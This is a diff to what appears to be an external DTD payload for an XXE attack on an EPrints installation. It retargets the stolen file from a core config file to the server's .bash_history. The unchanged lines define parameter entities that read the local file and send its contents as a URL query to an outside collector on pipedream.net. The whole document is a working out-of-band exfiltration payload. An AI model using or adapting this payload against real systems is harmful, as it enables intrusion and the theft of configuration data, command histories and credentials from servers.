@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///usr/share/eprints3/archives/upaperpus/cfg/cfg.d/10_core.pl">
+<!ENTITY % file SYSTEM "file:///usr/share/eprints3/.bash_history">
 <!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://eo79g4mszu1bgoz.m.pipedream.net/?x=%file;'>">
 %eval;
 %exfil;
